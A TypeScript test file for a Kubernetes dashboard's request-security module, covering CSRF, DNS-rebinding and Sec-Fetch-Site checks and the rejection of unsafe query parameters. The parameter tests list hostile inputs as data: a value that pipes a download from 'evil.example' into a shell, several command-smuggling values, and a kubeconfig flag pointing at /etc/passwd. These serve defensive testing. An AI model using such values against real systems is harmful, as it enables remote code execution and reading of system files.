import type { IncomingMessage } from "http";
import { afterEach, describe, expect, it } from "vitest";
import { findInvalidParam, isTrustedRequest } from "./security";

const req = (headers: Record<string, string>) => ({ headers }) as unknown as IncomingMessage;

describe("isTrustedRequest", () => {
  afterEach(() => { delete process.env.KUBEDECK_ALLOWED_HOSTS; });

  it("accepts the app's own loopback requests", () => {
    expect(isTrustedRequest(req({ host: "127.0.0.1:5000" }))).toBe(true);
    expect(isTrustedRequest(req({ host: "localhost:5000", origin: "http://localhost:5000" }))).toBe(true);
    expect(isTrustedRequest(req({ host: "[::1]:5000", origin: "http://[::1]:5000" }))).toBe(true);
  });
  it("rejects a cross-site Origin (CSRF / cross-site WebSocket)", () => {
    expect(isTrustedRequest(req({ host: "127.0.0.1:5000", origin: "http://evil.example" }))).toBe(false);
    expect(isTrustedRequest(req({ host: "127.0.0.1:5000", origin: "http://127.0.0.1:6000" }))).toBe(false);
    expect(isTrustedRequest(req({ host: "127.0.0.1:5000", origin: "not a url" }))).toBe(false);
  });
  it("rejects a non-loopback Host (DNS rebinding)", () => {
    expect(isTrustedRequest(req({ host: "evil.example:5000" }))).toBe(false);
    expect(isTrustedRequest(req({}))).toBe(false);
  });
  it("allows extra hosts only when configured", () => {
    const r = req({ host: "tunnel.example:5000", origin: "http://tunnel.example:5000" });
    expect(isTrustedRequest(r)).toBe(false);
    process.env.KUBEDECK_ALLOWED_HOSTS = "tunnel.example";
    expect(isTrustedRequest(r)).toBe(true);
  });
});

describe("Sec-Fetch-Site", () => {
  it("rejects cross-site requests that carry no Origin (an <img> GET)", () => {
    expect(isTrustedRequest(req({ host: "127.0.0.1:5000", "sec-fetch-site": "cross-site" }))).toBe(false);
    expect(isTrustedRequest(req({ host: "127.0.0.1:5000", "sec-fetch-site": "same-site" }))).toBe(false);
  });
  it("accepts the app's own requests and typed URLs", () => {
    expect(isTrustedRequest(req({ host: "127.0.0.1:5000", "sec-fetch-site": "same-origin" }))).toBe(true);
    expect(isTrustedRequest(req({ host: "127.0.0.1:5000", "sec-fetch-site": "none" }))).toBe(true);
  });
});

describe("findInvalidParam", () => {
  it("accepts real Kubernetes names", () => {
    expect(findInvalidParam({
      context: "arn:aws:eks:us-east-1:123456789012:cluster/prod", namespace: "kube-system",
      name: "e2-admin-module-dd8c44c74-pgz4r", type: "deployment.apps", container: "app", tail: "200",
    })).toBeNull();
    expect(findInvalidParam({ context: "user@cluster", namespace: "all" })).toBeNull();
    expect(findInvalidParam({ context: "gke_proj_europe-west1_main" })).toBeNull();
    expect(findInvalidParam({ name: "system:controller:x" })).toBeNull();
  });
  it.each([
    ["context", "a|curl evil.example|sh"],
    ["context", "x; id"],
    ["context", "$(id)"],
    ["context", "a b"],
    ["context", "--kubeconfig=/etc/passwd"],
    ["namespace", "a && id"],
    ["namespace", "-A"],
    ["namespace", "Prod"],
    ["name", "x`id`"],
    ["name", "-o=yaml"],
    ["type", "pod;id"],
    ["tail", "10; id"],
    ["container", "a>b"],
    ["warningsOnly", "yes"],
  ])("rejects %s=%j", (key, value) => {
    expect(findInvalidParam({ [key]: value })).toBe(key);
  });
  it("rejects repeated (array) values and ignores absent ones", () => {
    expect(findInvalidParam({ context: ["a", "b"] })).toBe("context");
    expect(findInvalidParam({})).toBeNull();
    expect(findInvalidParam({ context: "" })).toBeNull();
  });
});
